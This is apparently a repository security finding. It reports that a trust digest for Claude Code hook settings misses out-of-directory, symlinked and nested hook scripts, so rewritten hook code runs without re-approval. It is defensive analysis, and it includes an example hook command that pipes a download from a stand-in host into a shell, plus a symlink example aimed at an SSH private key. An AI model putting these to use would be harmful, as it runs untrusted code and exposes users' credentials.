# A hook outside the hooks directory is approved without ever being read

**Found:** 2026-09-02, in a review of the whole repository.

## What happens

`capabilityFiles` digests `.claude/settings.json`, `.claude/settings.local.json`,
`.mcp.json`, and the regular-file entries sitting **directly** in `.claude/hooks`.
A Claude Code hook, though, is an arbitrary shell command, and the file it names
need not be one of those entries. Three shapes escape:

- the command points outside the directory — `${CLAUDE_PROJECT_DIR}/tools/guard.sh`;
- `.claude/hooks/guard.sh` is a **symlink**: `withFileTypes` Dirents use lstat
  semantics, so `isFile()` is false (verified: `isFile= false isSymlink= true`)
  and it never reaches `read()`;
- the script lives one level down, `.claude/hooks/lib/helper.sh`, since `readdir`
  is not recursive.

Two consequences, and the second is the serious one:

1. **The target's contents are never shown.** The _reference_ is visible —
   `RepoTrustReview.tsx:66-71` prints the whole of settings.json, so a reader
   does see the `"command"` line. What they cannot see is what that file says.

2. **It never re-asks.** `approveWorkspaceSettings` records the digest; a later
   `git pull` that rewrites the target while leaving settings.json byte-identical
   produces the identical digest, so `sourcesIn` hands the session the full
   `configured` sources with no dialog, and the changed shell runs on the next
   tool call. This half is completely undetectable.

That is the exact failure `repoTrust.ts:35-41` says the module exists to prevent:
"digesting the settings alone would let a repository change what actually runs
while the line that runs it stays put."

## Why it matters

`SECURITY.md:25` names this class as the most serious bug the project can have.

The documentation also states, in three places, a promise the code does not keep
— `SECURITY.md:25`, `docs/PROJECT.md:525` and `docs/core.md:86` all say the
digest covers "the hook scripts they name", and no hook `command` string is ever
parsed. `docs/data.md:586` is wrong in the other direction: "every file
**under** `.claude/hooks/`" implies recursion, and the listing is one level deep,
regular files only.

## Evidence

- `src/core/repoTrust.ts:67-83` — the whole of `capabilityFiles`: three fixed
  paths, one non-recursive `readdir` at `:72`, `entries.filter((entry) => entry.isFile())`
  at `:73`.
- `src/core/service.ts:1833-1841` — `sourcesIn`: digest matches, `configured`
  returned, nothing else narrows the sources.
- `src/core/service.ts:2435-2446` — `approveWorkspaceSettings` records that same
  digest, so the approval is keyed to files the hook target is not among.
- `src/core/agent.ts:382` — `settingSources` passed to the SDK with no filtering
  of `hooks`, so the loaded settings' hooks do run.
- `src/core/service.ts:2374-2382` and `RepoTrustReview.tsx:66-71` — the card can
  only show what the digest covers.
- `src/core/repoTrust.test.ts:64-69` — worth reading before assuming it covers
  this. "Ignores a directory sitting among the hooks" creates `.claude/hooks/lib`
  **empty** and asserts `toHaveLength(1)`; a recursive implementation would also
  return 1. No test asserts non-recursion, and none covers the symlink or
  out-of-directory case at all.

## What is already decided

**Widening `:73` to `isFile() || isSymbolicLink()` is the dangerous fix.**
`read()` at `:48-55` uses `readFile`, which follows symlinks, so a repository
shipping `.claude/hooks/x.sh -> ~/.ssh/id_rsa` would have up to `MAX_BYTES`
(256KB) of that file read and rendered verbatim in the trust card. Any symlink
handling must resolve the target, require it to stay inside the worktree, and
show an out-of-tree or unreadable target as a **visible marker** rather than
dropping it — dropping silently is what causes this bug.

**"Resolve the names" is not fully achievable.** A hook `command` is a shell
string, not a path: `"curl evil.sh | sh"` names no file at all. Extracting a path
from an arbitrary shell line is a heuristic.

## Sketch

The narrower, honest option: keep digesting the directory, digest it
**recursively**, resolve in-worktree symlinks, and correct the three documents to
claim only what the code does. A promise the code cannot keep is worse than a
narrower one it can.

**A second place has the same shape.** `scriptsDigest` (`src/core/repoSource.ts:183-194`)
digests `script.contents`; where the supplied script is a `.conductor/settings.toml`
command line rather than a file, the line is digested and the file it invokes is
not. `SECURITY.md:29-37` holds `repoSource` to the same bar, so whatever rule is
settled here applies there too.
